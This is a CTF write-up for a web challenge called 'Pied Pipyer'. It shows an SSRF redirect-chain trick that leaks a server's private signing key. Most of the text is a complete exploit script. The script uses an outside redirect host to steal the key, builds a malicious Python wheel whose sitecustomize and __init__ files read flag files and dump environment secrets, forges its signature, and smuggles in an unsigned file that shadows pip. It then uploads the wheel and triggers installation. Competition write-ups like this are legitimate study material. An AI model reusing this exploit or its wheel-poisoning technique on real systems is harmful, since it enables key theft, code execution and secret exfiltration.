---
created: 2026-03-08T12:07
points: 180
solves: 17
title: Pied Pipyer
updated: 2026-03-11T15:36
---

After some analysis, we find that if an `NetworkException` is thrown, it contains a method `getRedirectResponses()` that returns the chain of redirects that led to the error.

```php
try{
} catch (\App\Exceptions\NetworkException $e) {
    http_response_code($e->getHttpCode());
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage(),
        'redirect_chain' => $e->getRedirectResponses(),
    ]);
}
```

If we have a redirect chain like this:

```
http://attacker.com -> http://localhost:5000/keys/private
```

Then the `getRedirectResponses()` method would return an array containing the URLs in the redirect chain, which we can use to leak the private key.

However if we try this directly, a different error is thrown instead of the `NetworkException`:

```php [IngestionController.php:upload]
if (!preg_match('/\.whl$/i', $file['name'])) {
    throw new \RuntimeException("Only .whl files are allowed for upload");
}
```

To throw a network exception, we need to sneak in a 307, and have too many redirects.

```php [IngestionController.php:downloadUrl]
if ($httpCode === 307) {
    $has307 = true;
}
...
if ($redirectCount > $maxRedirects && $has307) {
    throw new \App\Exceptions\NetworkException(
        "Too many redirects (>{$maxRedirects})",
        $redirectChain
    );
}
```

And we have the private key!

I tried to make the AI write the script to upload a whl and then upload it, but for some reason it just doesn't work, my teammate took my script, asked AI and solved it.

Below is the script from my teammate.

```python
import json
import os
import subprocess
import tempfile
import zipfile

import requests

# Override with TARGET env var if needed.
target = os.environ.get("TARGET", "http://127.0.0.1:34939")

# Use a fresh version each run so pip cannot say "already satisfied".
version = os.environ.get("PKG_VERSION", "1.0.%d" % os.getpid())
package_name = os.environ.get("PKG_NAME", "hello-world-package")
module_name = package_name.replace("-", "_")

print(f"[+] target={target}")
print(f"[+] package={package_name} version={version}")

r = requests.post(
    f"{target}/ingest/url",
    json={"url": "http://168.138.68.98:65037"},
    timeout=60,
)
j = r.json()
print(f"[+] ingest/url status: {r.status_code}")
print("[+] ingest/url response keys:", list(j.keys()))

chain = j.get("redirect_chain")
if not chain and isinstance(j.get("data"), dict):
    chain = j["data"].get("redirect_chain")
if not chain:
    raise RuntimeError(f"redirect_chain not found in response: {j}")

body = chain[-1]["body_preview"]
key_blob = json.loads(body)
private_key = key_blob["content"]
print("[+] leaked private key")

temp_dir = tempfile.mkdtemp(prefix="pied_")
package_dir = os.path.join(temp_dir, module_name)
os.makedirs(package_dir)

setup_py = f'''
from setuptools import setup

setup(
    name={package_name!r},
    version={version!r},
    packages={[module_name]!r},
    py_modules=["sitecustomize"],
)
'''

with open(os.path.join(temp_dir, "setup.py"), "w") as f:
    f.write(setup_py)

init_py = r'''
import os
print("[pwn] package imported")
for p in ("/var/www/html/flag.txt", "/flag.txt", "flag.txt"):
    try:
        with open(p, "r") as f:
            print("[pwn]", p, f.read())
    except Exception:
        pass

for k in ("FLAG", "SECRET", "TOKEN", "KEY"):
    for ek, ev in os.environ.items():
        if k in ek.upper():
            print(f"[pwn-env] {ek}={ev}")
'''

with open(os.path.join(package_dir, "__init__.py"), "w") as f:
    f.write(init_py)

sitecustomize_py = r'''
import os

print("[pwn] sitecustomize loaded")
for p in ("/var/www/html/flag.txt", "/flag.txt", "flag.txt"):
    try:
        with open(p, "r") as f:
            print("[pwn-flag]", p, f.read())
    except Exception:
        pass

for k in ("FLAG", "SECRET", "TOKEN", "KEY"):
    for ek, ev in os.environ.items():
        if k in ek.upper():
            print(f"[pwn-env] {ek}={ev}")
'''

with open(os.path.join(temp_dir, "sitecustomize.py"), "w") as f:
    f.write(sitecustomize_py)

subprocess.run(["python3", "setup.py", "bdist_wheel"], cwd=temp_dir, check=True)

dist_dir = os.path.join(temp_dir, "dist")
whl_file = [f for f in os.listdir(dist_dir) if f.endswith(".whl")][0]
whl_path = os.path.join(dist_dir, whl_file)
print("[+] built wheel:", whl_file)

extract_dir = os.path.join(temp_dir, "extracted")
os.makedirs(extract_dir)
with zipfile.ZipFile(whl_path, "r") as zf:
    zf.extractall(extract_dir)

dist_info_dir = [d for d in os.listdir(extract_dir) if d.endswith(".dist-info")][0]
record_path = os.path.join(extract_dir, dist_info_dir, "RECORD")

key_file = os.path.join(temp_dir, "private_key.pem")
with open(key_file, "w") as f:
    f.write(private_key)

sig_path = os.path.join(extract_dir, dist_info_dir, "RECORD.sig")
subprocess.run(
    ["openssl", "dgst", "-sha256", "-sign", key_file, "-out", sig_path, record_path],
    check=True,
)

# Add a post-signing payload file not covered by RECORD hashes.
# The server only verifies RECORD signature and does not validate file list/hashes.
pip_dir = os.path.join(extract_dir, "pip")
os.makedirs(pip_dir, exist_ok=True)
pip_init_payload = r'''
import os

print("[pwn] pip imported")
for p in ("/var/www/html/flag.txt", "/flag.txt", "flag.txt"):
    try:
        with open(p, "r") as f:
            print("[pwn-flag]", p, f.read())
    except Exception:
        pass

__version__ = "24.1b1"
'''
with open(os.path.join(pip_dir, "__init__.py"), "w") as f:
    f.write(pip_init_payload)

# Keep a valid wheel filename; pip rejects bad names.
new_whl_name = whl_file
new_whl_path = os.path.join(temp_dir, new_whl_name)
with zipfile.ZipFile(new_whl_path, "w", zipfile.ZIP_DEFLATED) as zf:
    for root, _dirs, files in os.walk(extract_dir):
        for file in files:
            full_path = os.path.join(root, file)
            arcname = os.path.relpath(full_path, extract_dir)
            zf.write(full_path, arcname)

print(f"[+] malicious wheel created at: {new_whl_path}")

with open(new_whl_path, "rb") as f:
    files = {"file": (new_whl_name, f, "application/zip")}
    r = requests.post(f"{target}/ingest/upload", files=files, timeout=20)
    print("[+] upload status:", r.status_code)
    try:
        print("[+] upload response:", r.json())
    except Exception:
        print("[+] upload raw:", r.text[:1000])

# Try both methods in case endpoint changed.
install_resp = None
for method in ("GET", "POST", "GET"):
    try:
        rr = requests.request(method, f"{target}/pip/install", timeout=60)
        print(f"[+] /pip/install via {method}: HTTP {rr.status_code}")
        try:
            data = rr.json()
            print(json.dumps(data, indent=2)[:5000])
            install_resp = data
        except Exception:
            print(rr.text[:5000])
    except Exception as e:
        print(f"[-] /pip/install via {method} failed: {e}")

if install_resp and isinstance(install_resp, dict):
    if "stdout" in install_resp:
        print("\n[stdout]\n" + install_resp["stdout"])
    if "stderr" in install_resp:
        print("\n[stderr]\n" + install_resp["stderr"])

print(f"[+] temp dir: {temp_dir}")
```

```flag
?
```
